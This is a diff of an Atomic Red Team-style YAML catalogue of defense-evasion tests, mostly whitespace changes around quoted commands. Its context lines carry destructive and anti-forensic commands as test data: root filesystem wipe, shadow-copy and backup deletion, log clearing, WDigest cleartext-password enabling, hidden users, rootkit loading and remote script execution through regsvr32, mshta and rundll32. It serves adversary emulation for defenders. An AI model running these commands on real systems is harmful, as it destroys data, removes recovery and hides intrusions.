     - name: Delete a single file - Linux/macOS
       description: 'Delete a single file from the temporary directory
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -7243,12 +7243,12 @@ defense-evasion:
         name: sh
         command: 'rm -f #{file_to_delete}
 
-'
+          '
     - name: Delete an entire folder - Linux/macOS
       description: 'Recursively delete the temporary directory and all files contained
         within it
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -7261,12 +7261,12 @@ defense-evasion:
         name: sh
         command: 'rm -rf #{folder_to_delete}
 
-'
+          '
     - name: Overwrite and delete a file with shred
       description: 'Use the `shred` command to overwrite the temporary file and then
         delete it
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -7278,11 +7278,11 @@ defense-evasion:
         name: sh
         command: 'shred -u #{file_to_shred}
 
-'
+          '
     - name: Delete a single file - Windows cmd
       description: 'Delete a single file from the temporary directory using cmd.exe
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -7295,7 +7295,7 @@ defense-evasion:
       description: 'Recursively delete the temporary directory and all files contained
         within it using cmd.exe
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -7307,7 +7307,7 @@ defense-evasion:
     - name: Delete a single file - Windows PowerShell
       description: 'Delete a single file from the temporary directory using Powershell
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -7320,7 +7320,7 @@ defense-evasion:
       description: 'Recursively delete the temporary directory and all files contained
         within it using Powershell
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -7332,7 +7332,7 @@ defense-evasion:
     - name: Delete VSS - vssadmin
       description: 'Delete all volume shadow copies with vssadmin.exe
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -7340,11 +7340,11 @@ defense-evasion:
         elevation_required: true
         command: 'vssadmin.exe Delete Shadows /All /Quiet
 
-'
+          '
     - name: Delete VSS - wmic
       description: 'Delete all volume shadow copies with wmic
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -7352,11 +7352,11 @@ defense-evasion:
         elevation_required: true
         command: 'wmic shadowcopy delete
 
-'
+          '
     - name: bcdedit
       description: 'This test leverages `bcdedit` to remove boot-time recovery measures.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -7368,7 +7368,7 @@ defense-evasion:
     - name: wbadmin
       description: 'This test deletes Windows Backup catalogs.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -7376,25 +7376,25 @@ defense-evasion:
         elevation_required: true
         command: 'wbadmin delete catalog -quiet
 
-'
+          '
     - name: Delete Filesystem - Linux
       description: 'This test deletes the entire root filesystem of a Linux system.
         This technique was used by Amnesia IoT malware to avoid analysis. This test
         is dangerous and destructive, do NOT use on production equipment.
 
-'
+        '
       supported_platforms:
       - linux
       executor:
         name: bash
         command: 'rm -rf / --no-preserve-root > /dev/null 2> /dev/null
 
-'
+          '
     - name: Delete-PrefetchFile
       description: 'Delete a single prefetch file.  Deletion of prefetch files is
         a known anti-forensic technique.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -7403,7 +7403,7 @@ defense-evasion:
         command: 'Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem
           -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
 
-'
+          '
     - name: Delete TeamViewer Log Files
       description: |
         Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.
@@ -7522,7 +7522,7 @@ defense-evasion:
       description: 'Modifies the filesystem permissions of the specified file or folder
         to take ownership of the object.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -7534,12 +7534,12 @@ defense-evasion:
         name: command_prompt
         command: 'takeown.exe /f #{file_folder_to_own}
 
-'
+          '
     - name: Take ownership recursively using takeown utility
       description: 'Modifies the filesystem permissions of the specified folder to
         take ownership of it and its contents.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -7551,12 +7551,12 @@ defense-evasion:
         name: command_prompt
         command: 'takeown.exe /f #{folder_to_own} /r
 
-'
+          '
     - name: cacls - Grant permission to specified user or group
       description: 'Modifies the filesystem permissions of the specified file or folder
         to allow the specified user or group Full Control.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -7572,12 +7572,12 @@ defense-evasion:
         name: command_prompt
         command: 'cacls.exe #{file_or_folder} /grant #{user_or_group}:F
 
-'
+          '
     - name: cacls - Grant permission to specified user or group recursively
       description: 'Modifies the filesystem permissions of the specified folder and
         contents to allow the specified user or group Full Control.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -7593,12 +7593,12 @@ defense-evasion:
         name: command_prompt
         command: 'cacls.exe #{file_or_folder} /grant #{user_or_group}:F /t
 
-'
+          '
     - name: icacls - Grant permission to specified user or group
       description: 'Modifies the filesystem permissions of the specified file or folder
         to allow the specified user or group Full Control.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -7614,12 +7614,12 @@ defense-evasion:
         name: command_prompt
         command: 'icacls.exe #{file_or_folder} /grant #{user_or_group}:F
 
-'
+          '
     - name: icacls - Grant permission to specified user or group recursively
       description: 'Modifies the filesystem permissions of the specified folder and
         contents to allow the specified user or group Full Control.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -7635,12 +7635,12 @@ defense-evasion:
         name: command_prompt
         command: 'icacls.exe #{file_or_folder} /grant #{user_or_group}:F /t
 
-'
+          '
     - name: attrib - Remove read-only attribute
       description: 'Removes the read-only attribute from a file or folder using the
         attrib.exe command.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -7652,12 +7652,12 @@ defense-evasion:
         name: command_prompt
         command: 'attrib.exe -r #{file_or_folder}
 
-'
+          '
     - name: chmod - Change file or folder mode (numeric mode)
       description: 'Changes a file or folder''s permissions using chmod and a specified
         numeric mode.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -7674,12 +7674,12 @@ defense-evasion:
         name: bash
         command: 'chmod #{numeric_mode} #{file_or_folder}
 
-'
+          '
     - name: chmod - Change file or folder mode (symbolic mode)
       description: 'Changes a file or folder''s permissions using chmod and a specified
         symbolic mode.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -7696,12 +7696,12 @@ defense-evasion:
         name: bash
         command: 'chmod #{symbolic_mode} #{file_or_folder}
 
-'
+          '
     - name: chmod - Change file or folder mode (numeric mode) recursively
       description: 'Changes a file or folder''s permissions recursively using chmod
         and a specified numeric mode.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -7718,12 +7718,12 @@ defense-evasion:
         name: bash
         command: 'chmod #{numeric_mode} #{file_or_folder} -R
 
-'
+          '
     - name: chmod - Change file or folder mode (symbolic mode) recursively
       description: 'Changes a file or folder''s permissions recursively using chmod
         and a specified symbolic mode.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -7740,12 +7740,12 @@ defense-evasion:
         name: bash
         command: 'chmod #{symbolic_mode} #{file_or_folder} -R
 
-'
+          '
     - name: chown - Change file or folder ownership and group
       description: 'Changes a file or folder''s ownership and group information using
         chown.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -7766,12 +7766,12 @@ defense-evasion:
         name: bash
         command: 'chown #{owner}:#{group} #{file_or_folder}
 
-'
+          '
     - name: chown - Change file or folder ownership and group recursively
       description: 'Changes a file or folder''s ownership and group information recursively
         using chown.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -7792,11 +7792,11 @@ defense-evasion:
         name: bash
         command: 'chown #{owner}:#{group} #{file_or_folder} -R
 
-'
+          '
     - name: chown - Change file or folder mode ownership only
       description: 'Changes a file or folder''s ownership only using chown.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -7813,11 +7813,11 @@ defense-evasion:
         name: bash
         command: 'chown #{owner} #{file_or_folder}
 
-'
+          '
     - name: chown - Change file or folder ownership recursively
       description: 'Changes a file or folder''s ownership only recursively using chown.
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -7834,7 +7834,7 @@ defense-evasion:
         name: bash
         command: 'chown #{owner} #{file_or_folder} -R
 
-'
+          '
     - name: chattr - Remove immutable file attribute
       description: |
         Remove's a file's `immutable` attribute using `chattr`.
@@ -7851,7 +7851,7 @@ defense-evasion:
         name: sh
         command: 'chattr -i #{file_to_modify}
 
-'
+          '
   T1144:
     technique:
       x_mitre_permissions_required:
@@ -7930,7 +7930,7 @@ defense-evasion:
     - name: Gatekeeper Bypass
       description: 'Gatekeeper Bypass via command line
 
-'
+        '
       supported_platforms:
       - macos
       input_arguments:
@@ -7994,7 +7994,7 @@ defense-evasion:
     - name: Disable history collection
       description: 'Disables history collection in shells
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -8089,7 +8089,7 @@ defense-evasion:
     - name: Create a hidden file in a hidden directory
       description: 'Creates a hidden file inside a hidden directory
 
-'
+        '
       supported_platforms:
       - linux
       - macos
@@ -8101,11 +8101,11 @@ defense-evasion:
           echo "T1158" > /var/tmp/.hidden-directory/.hidden-file
         cleanup_command: 'rm -rf /var/tmp/.hidden-directory/
 
-'
+          '
     - name: Mac Hidden file
       description: 'Hide a file on MacOS
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -8114,12 +8114,12 @@ defense-evasion:
         command: 'xattr -lr * / 2>&1 /dev/null | grep -C 2 "00 00 00 00 00 00 00 00
           40 00 FF FF FF FF 00 00"
 
-'
+          '
     - name: Create Windows System File with Attrib
       description: 'Creates a file and marks it as a system file using the attrib.exe
         utility.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -8130,11 +8130,11 @@ defense-evasion:
           attrib.exe +s %TEMP%\T1158.txt
         cleanup_command: 'del /A:S %TEMP%\T1158.txt >nul 2>&1
 
-'
+          '
     - name: Create Windows Hidden File with Attrib
       description: 'Creates a file and marks it as hidden using the attrib.exe utility.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -8145,11 +8145,11 @@ defense-evasion:
           attrib.exe +h %TEMP%\T1158_hidden.txt
         cleanup_command: 'del /A:H %TEMP%\T1158_hidden.txt >nul 2>&1
 
-'
+          '
     - name: Hidden files
       description: 'Requires Apple Dev Tools
 
-'
+        '
       supported_platforms:
       - macos
       input_arguments:
@@ -8162,11 +8162,11 @@ defense-evasion:
         elevation_required: false
         command: 'setfile -a V #{filename}
 
-'
+          '
     - name: Hide a Directory
       description: 'Hide a directory on MacOS
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -8177,11 +8177,11 @@ defense-evasion:
           chflags hidden /var/tmp/T1158_mac.txt
         cleanup_command: 'rm /var/tmp/T1158_mac.txt
 
-'
+          '
     - name: Show all hidden files
       description: 'Show all hidden files on MacOS
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -8189,15 +8189,15 @@ defense-evasion:
         elevation_required: false
         command: 'defaults write com.apple.finder AppleShowAllFiles YES
 
-'
+          '
         cleanup_command: 'defaults write com.apple.finder AppleShowAllFiles NO
 
-'
+          '
     - name: Create ADS command prompt
       description: 'Create an Alternate Data Stream with the command prompt. Write
         access is required.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -8215,15 +8215,15 @@ defense-evasion:
         command: |
           echo "Normal Text." > #{file_name}
           echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
-          for /f "usebackq delims=φ" %i in (#{file_name}:#{ads_filename}) do %i
+          for /f "usebackq delims=╧å" %i in (#{file_name}:#{ads_filename}) do %i
         cleanup_command: 'del #{file_name} >nul 2>&1
 
-'
+          '
     - name: Create ADS PowerShell
       description: 'Create an Alternate Data Stream with PowerShell. Write access
         is required.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -8245,7 +8245,7 @@ defense-evasion:
           ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname
         cleanup_command: 'Remove-Item -Path #{file_name} -ErrorAction Ignore
 
-'
+          '
   T1147:
     technique:
       x_mitre_data_sources:
@@ -8293,7 +8293,7 @@ defense-evasion:
     - name: Hidden Users
       description: 'Add a hidden user on MacOS
 
-'
+        '
       supported_platforms:
       - macos
       input_arguments:
@@ -8305,7 +8305,7 @@ defense-evasion:
         name: sh
         command: 'sudo dscl . -create /Users/#{user_name} UniqueID 333
 
-'
+          '
   T1143:
     technique:
       x_mitre_permissions_required:
@@ -8377,7 +8377,7 @@ defense-evasion:
         elevation_required: false
         command: 'Start-Process #{powershell_command}
 
-'
+          '
   T1183:
     technique:
       x_mitre_data_sources:
@@ -8467,7 +8467,7 @@ defense-evasion:
     - name: IFEO Add Debugger
       description: 'Leverage Global Flags Settings
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -8485,15 +8485,15 @@ defense-evasion:
         command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 
-'
+          '
         cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /f
 
-'
+          '
     - name: IFEO Global Flags
       description: 'Leverage Global Flags Settings
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -8597,7 +8597,7 @@ defense-evasion:
     - name: Clear Logs
       description: 'Upon execution this test will clear Windows Event Logs
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -8610,12 +8610,12 @@ defense-evasion:
         elevation_required: true
         command: 'wevtutil cl #{log_name}
 
-'
+          '
     - name: FSUtil
       description: 'Manages the update sequence number (USN) change journal, which
         provides a persistent log of all changes made to files on the volume.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -8623,11 +8623,11 @@ defense-evasion:
         elevation_required: true
         command: 'fsutil usn deletejournal /D C:
 
-'
+          '
     - name: rm -rf
       description: 'Delete system and audit logs
 
-'
+        '
       supported_platforms:
       - macos
       - linux
@@ -8641,7 +8641,7 @@ defense-evasion:
         This technique was used by threat actor Rocke during the exploitation of Linux
         web servers.
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -8653,12 +8653,12 @@ defense-evasion:
         name: bash
         command: 'echo 0> /var/spool/mail/#{username}
 
-'
+          '
     - name: Overwrite Linux Log
       description: 'This test overwrites the specified log. This technique was used
         by threat actor Rocke during the exploitation of Linux web servers.
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -8670,12 +8670,12 @@ defense-evasion:
         name: bash
         command: 'echo 0> #{log_path}
 
-'
+          '
     - name: Delete System Logs Using PowerShell
       description: 'Recommended Detection: Monitor for use of the windows event log
         filepath in PowerShell couple with delete arguments
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -8687,11 +8687,11 @@ defense-evasion:
           Remove-Item C:\Windows\System32\winevt\Logs\Security.evtx
         cleanup_command: 'Start-Service -Name EventLog
 
-'
+          '
     - name: Delete System Logs Using Clear-EventLogId
       description: 'Clear event logs using built-in PowerShell commands
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -8699,7 +8699,7 @@ defense-evasion:
         elevation_required: true
         command: 'Clear-EventLog -logname Application
 
-'
+          '
   T1202:
     technique:
       x_mitre_data_sources:
@@ -8891,7 +8891,7 @@ defense-evasion:
     - name: Install root CA on CentOS/RHEL
       description: 'Creates a root CA with openssl
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -8973,7 +8973,7 @@ defense-evasion:
       description: 'Executes the CheckIfInstallable class constructor runner instead
         of executing InstallUtil.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -9039,7 +9039,7 @@ defense-evasion:
       description: 'Executes the InstallHelper class constructor runner instead of
         executing InstallUtil.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -9106,7 +9106,7 @@ defense-evasion:
     - name: InstallUtil class constructor method call
       description: 'Executes the installer assembly class constructor.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -9173,7 +9173,7 @@ defense-evasion:
     - name: InstallUtil Install method call
       description: 'Executes the Install Method
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -9240,7 +9240,7 @@ defense-evasion:
     - name: InstallUtil Uninstall method call - /U variant
       description: 'Executes the Uninstall Method
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -9308,7 +9308,7 @@ defense-evasion:
         variant
       description: 'Executes the Uninstall Method
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -9375,7 +9375,7 @@ defense-evasion:
     - name: InstallUtil HelpText method call
       description: 'Executes the Uninstall Method
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -9443,7 +9443,7 @@ defense-evasion:
       description: 'Executes an InstallUtil assembly by renaming InstallUtil.exe and
         using a nonstandard extension for the assembly.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -9560,14 +9560,14 @@ defense-evasion:
     - name: Launchctl
       description: 'Utilize launchctl
 
-'
+        '
       supported_platforms:
       - macos
       executor:
         name: sh
         command: 'launchctl submit -l evil -- /Applications/Calculator.app/Contents/MacOS/Calculator
 
-'
+          '
   T1036:
     technique:
       x_mitre_data_sources:
@@ -9693,7 +9693,7 @@ defense-evasion:
           %SystemRoot%\Temp\lsass.exe /B
         cleanup_command: 'del /Q /F %SystemRoot%\Temp\lsass.exe >nul 2>&1
 
-'
+          '
     - name: Masquerading as Linux crond process.
       description: |
         Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.
@@ -9722,7 +9722,7 @@ defense-evasion:
           cmd.exe /c %APPDATA%\notepad.exe /B
         cleanup_command: 'del /Q /F %APPDATA%\notepad.exe >nul 2>&1
 
-'
+          '
     - name: Masquerading - wscript.exe running as svchost.exe
       description: |
         Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.
@@ -9738,7 +9738,7 @@ defense-evasion:
           cmd.exe /c %APPDATA%\svchost.exe /B
         cleanup_command: 'del /Q /F %APPDATA%\svchost.exe >nul 2>&1
 
-'
+          '
     - name: Masquerading - powershell.exe running as taskhostw.exe
       description: |
         Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.
@@ -9754,7 +9754,7 @@ defense-evasion:
           cmd.exe /K %APPDATA%\taskhostw.exe
         cleanup_command: 'del /Q /F %APPDATA%\taskhostw.exe >nul 2>&1
 
-'
+          '
     - name: Masquerading - non-windows exe running as windows exe
       description: |
         Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe
@@ -9787,12 +9787,12 @@ defense-evasion:
           Stop-Process -ID $myT1036
         cleanup_command: 'Remove-Item #{outputfile} -Force -ErrorAction Ignore
 
-'
+          '
     - name: Masquerading - windows exe running as different windows exe
       description: 'Copies a windows exe, renames it as another windows exe, and launches
         it to masquerade as second windows exe
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -9813,7 +9813,7 @@ defense-evasion:
           Stop-Process -ID $myT1036
         cleanup_command: 'Remove-Item #{outputfile} -Force -ErrorAction Ignore
 
-'
+          '
     - name: Malicious process Masquerading as LSM.exe
       description: |
         Detect LSM running from an incorrect directory and an incorrect service account
@@ -9917,7 +9917,7 @@ defense-evasion:
       description: 'Modify the registry of the currently logged in user using reg.exe
         cia cmd console
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -9926,11 +9926,11 @@ defense-evasion:
         command: 'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
           /t REG_DWORD /v HideFileExt /d 1 /f
 
-'
+          '
         cleanup_command: 'reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
           /v HideFileExt /f
 
-'
+          '
     - name: Modify Registry of Local Machine - cmd
       description: |
         Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when
@@ -9943,16 +9943,16 @@ defense-evasion:
         command: 'reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
           /t REG_EXPAND_SZ /v SecurityHealth /d {some_other_executable} /f
 
-'
+          '
         cleanup_command: 'reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
           /v SecurityHealth /f
 
-'
+          '
     - name: Modify Registry of Another User Profile
       description: 'Modify a registry key of each user profile not currently loaded
         on the machine using both powershell and cmd line tools.
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -10015,7 +10015,7 @@ defense-evasion:
       description: 'Sets registry key that will tell windows to store plaintext passwords
         (making the system vulnerable to clear text / cleartext password dumping)
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -10024,16 +10024,16 @@ defense-evasion:
         command: 'reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
           /v UseLogonCredential /t REG_DWORD /d 1 /f
 
-'
+          '
         cleanup_command: 'reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
           /v UseLogonCredential /t REG_DWORD /d 0 /f
 
-'
+          '
     - name: Modify registry to store PowerShell code
       description: 'Sets Windows Registry key containing base64-encoded PowerShell
         code.
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -10061,7 +10061,7 @@ defense-evasion:
         cleanup_command: 'Remove-ItemProperty -Force -Path #{registry_key_storage}
           -Name #{registry_entry_storage} -ErrorAction Ignore
 
-'
+          '
     - name: Add domain to Trusted sites Zone
       description: |
         Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365 as described here:
@@ -10085,7 +10085,7 @@ defense-evasion:
       description: 'Upon execution, a javascript block will be placed in the registry
         for persistence
 
-'
+        '
       supported_platforms:
       - windows
       executor:
@@ -10094,11 +10094,11 @@ defense-evasion:
         command: 'New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet
           Settings" -Name T1112 -Value "<script>"
 
-'
+          '
         cleanup_command: 'Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet
           Settings" -Name T1112 -ErrorAction Ignore
 
-'
+          '
   T1170:
     technique:
       x_mitre_data_sources:
@@ -10203,7 +10203,7 @@ defense-evasion:
         elevation_required: false
         command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
 
-'
+          '
     - name: Mshta calls a local VBScript file to launch notepad.exe
       description: Tests execution of a local program by a VBScript file called by
         Mshta
@@ -10218,7 +10218,7 @@ defense-evasion:
         name: command_prompt
         command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""#{local_file_path}"")(window.close)")
 
-'
+          '
     - name: Mshta executes VBScript to execute malicious command
       description: |
         Run a local VB script to run local user enumeration powershell command
@@ -10231,7 +10231,7 @@ defense-evasion:
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
           -noexit -file $PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
 
-'
+          '
     - name: Mshta Executes Remote HTML Application (HTA)
       description: |
         Execute an arbitrary remote HTA.
@@ -10255,7 +10255,7 @@ defense-evasion:
           mshta "#{temp_file}"
         cleanup_command: 'remove-item "#{temp_file}" -ErrorAction Ignore
 
-'
+          '
   T1096:
     technique:
       x_mitre_data_sources:
@@ -10396,7 +10396,7 @@ defense-evasion:
           Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""
         cleanup_command: 'Remove-Item "#{ads_file_path}" -Force -ErrorAction Ignore
 
-'
+          '
   T1126:
     technique:
       x_mitre_data_sources:
@@ -10452,7 +10452,7 @@ defense-evasion:
     - name: Add Network Share
       description: 'Add a Network Share utilizing the command_prompt
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -10469,7 +10469,7 @@ defense-evasion:
     - name: Remove Network Share
       description: 'Removes a Network Share utilizing the command_prompt
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -10482,11 +10482,11 @@ defense-evasion:
         elevation_required: false
         command: 'net share #{share_name} /delete
 
-'
+          '
     - name: Remove Network Share PowerShell
       description: 'Removes a Network Share utilizing PowerShell
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -10680,7 +10680,7 @@ defense-evasion:
         cleanup_command: 'Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage}
           -Name #{registry_entry_storage}
 
-'
+          '
   T1502:
     technique:
       x_mitre_data_sources:
@@ -10859,7 +10859,7 @@ defense-evasion:
     - name: Plist Modification
       description: 'Modify MacOS plist file in one of two directories
 
-'
+        '
       supported_platforms:
       - macos
       executor:
@@ -11178,7 +11178,7 @@ defense-evasion:
         elevation_required: true
         command: 'echo #{path_to_shared_library} > /etc/ld.so.preload
 
-'
+          '
     - name: Shared Library Injection via LD_PRELOAD
       description: |
         This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.
@@ -11196,7 +11196,7 @@ defense-evasion:
         elevation_required: false
         command: 'LD_PRELOAD=#{path_to_shared_library} ls
 
-'
+          '
     - name: Process Injection via C#
       description: |
         Process Injection using C#
@@ -11297,7 +11297,7 @@ defense-evasion:
     - name: Regasm Uninstall Method Call Test
       description: 'Executes the Uninstall Method, No Admin Rights Required
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -11325,12 +11325,12 @@ defense-evasion:
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}
         cleanup_command: 'del #{output_file} >nul 2>&1
 
-'
+          '
     - name: Regsvs Uninstall Method Call Test
       description: 'Executes the Uninstall Method, No Admin Rights Required, Requires
         SNK
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -11438,7 +11438,7 @@ defense-evasion:
       description: 'Regsvr32.exe is a command-line program used to register and unregister
         OLE controls
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -11458,12 +11458,12 @@ defense-evasion:
         elevation_required: false
         command: 'regsvr32.exe /s /u /i:#{filename} scrobj.dll
 
-'
+          '
     - name: Regsvr32 remote COM scriptlet execution
       description: 'Regsvr32.exe is a command-line program used to register and unregister
         OLE controls
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -11476,12 +11476,12 @@ defense-evasion:
         elevation_required: false
         command: 'regsvr32.exe /s /u /i:#{url} scrobj.dll
 
-'
+          '
     - name: Regsvr32 local DLL execution
       description: 'Regsvr32.exe is a command-line program used to register and unregister
         OLE controls
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -11503,7 +11503,7 @@ defense-evasion:
         command: 'IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe
           /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )
 
-'
+          '
   T1014:
     technique:
       x_mitre_data_sources:
@@ -11574,7 +11574,7 @@ defense-evasion:
     - name: Loadable Kernel Module based Rootkit
       description: 'Loadable Kernel Module based Rootkit
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -11586,11 +11586,11 @@ defense-evasion:
         name: sh
         command: 'sudo insmod #{rootkit_file}
 
-'
+          '
     - name: Loadable Kernel Module based Rootkit
       description: 'Loadable Kernel Module based Rootkit
 
-'
+        '
       supported_platforms:
       - linux
       input_arguments:
@@ -11602,7 +11602,7 @@ defense-evasion:
         name: sh
         command: 'sudo modprobe #{rootkit_file}
 
-'
+          '
     - name: Windows Signed Driver Rootkit Test
       description: |
         This test exploits a signed driver to execute code in Kernel.
@@ -11624,7 +11624,7 @@ defense-evasion:
         name: command_prompt
         command: 'puppetstrings #{driver_path}
 
-'
+          '
   T1085:
     technique:
       x_mitre_data_sources:
@@ -11687,7 +11687,7 @@ defense-evasion:
     - name: Rundll32 execute JavaScript Remote Payload With GetObject
       description: 'Test execution of a remote script using rundll32.exe
 
-'
+        '
       supported_platforms:
       - windows
       input_arguments:
@@ -11700,7 +11700,7 @@ defense-evasion:
         elevation_required: false
         command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
 
-'
+          '
     - name: Rundll32 execute VBscript command
       description: |
         Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
@@ -11718,7 +11718,7 @@ defense-evasion:
         elevation_required: false
         command: 'rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
 
-'
+          '
     - name: Rundll32 advpack.dll Execution
       description: |
         Test execution of a command using rundll32.exe with advpack.dll.
@@ -11743,7 +11743,7 @@ defense-evasion:
         elevation_required: false
         command: 'rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
 
-'
+          '
     - name: Rundll32 ieadvpack.dll Execution
       description: |
         Test execution of a command using rundll32.exe with ieadvpack.dll.
@@ -11768,7 +11768,7 @@ defense-evasion:
         elevation_required: false
         command: 'rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
 
-'
+          '
     - name: Rundll32 syssetup.dll Execution
       description: |
         Test execution of a command using rundll32.exe with syssetup.dll.
@@ -11794,7 +11794,7 @@ defense-evasion:
         command: 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall
           128 .\#{inf_to_execute}
 
-'
+          '
     - name: Rundll32 setupapi.dll Execution
       description: |
         Test execution of a command using rundll32.exe with setupapi.dll.
@@ -11820,7 +11820,7 @@ defense-evasion:
         command: 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128
           .\#{inf_to_execute}
 
-'
+          '
   T1064:
     technique:
       x_mitre_permissions_required:
@@ -11889,7 +11889,7 @@ defense-evasion:
     - name: Create and Execute Bash Shell Script
